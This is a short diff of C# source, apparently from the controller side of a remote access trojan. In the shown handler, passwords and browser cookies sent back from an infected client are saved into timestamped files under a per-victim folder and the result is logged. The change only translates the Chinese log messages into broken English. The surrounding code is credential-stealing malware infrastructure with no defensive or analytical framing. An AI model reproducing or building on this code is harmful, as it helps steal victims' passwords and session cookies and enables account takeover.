@@ -26,11 +26,11 @@ namespace Server.Handle_Packet
                         Directory.CreateDirectory(fullPath);
                     File.WriteAllText(fullPath + "\\Password_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", pass.Replace("\n", Environment.NewLine));
                     File.WriteAllText(fullPath + "\\Cookies_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", cookies);
-                    new HandleLogs().Addmsg($"客户端 {client.Ip} 密码恢复成功，密码保存在 @ ClientsFolder \\ {unpack_msgpack.ForcePathObject("Hwid").AsString} \\ Recovery", Color.Purple);
+                    new HandleLogs().Addmsg($"Client {client.Ip} password recoveried success，file located @ ClientsFolder \\ {unpack_msgpack.ForcePathObject("Hwid").AsString} \\ Recovery", Color.Purple);
                 }
                 else
                 {
-                    new HandleLogs().Addmsg($"客户端 {client.Ip} 未提取到密码", Color.MediumPurple);
+                    new HandleLogs().Addmsg($"Client {client.Ip} password recoveried error", Color.MediumPurple);
                 }
                 client?.Disconnected();
             }
